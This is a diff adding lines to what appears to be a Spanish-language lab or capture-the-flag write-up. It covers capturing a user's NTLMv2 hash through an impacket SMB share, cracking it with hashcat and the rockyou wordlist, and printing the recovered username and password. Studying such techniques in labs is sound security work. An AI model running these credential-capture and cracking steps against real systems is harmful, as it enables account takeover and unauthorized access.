@@ -46,4 +46,15 @@ Nos lo compartiremos como recurso de red con [[IMPACKET]]
 impacket-smbserver smbfolder $(pwd) -smb2support
 ```
 
-Lo subiremos y podremos obtener el hash `NTLMv2`
+Lo subiremos y podremos obtener el hash `NTLMv2` del usuario `toni`
+
+Ahora el hash lo podemos crackear usando [[HASHCAT]]
+```shell
+hashcat hash /usr/share/wordlists/rockyou.txt
+```
+
+Obteniendo las siguientes credenciales validas
+```ad-hint
+tony::liltony
+```
+
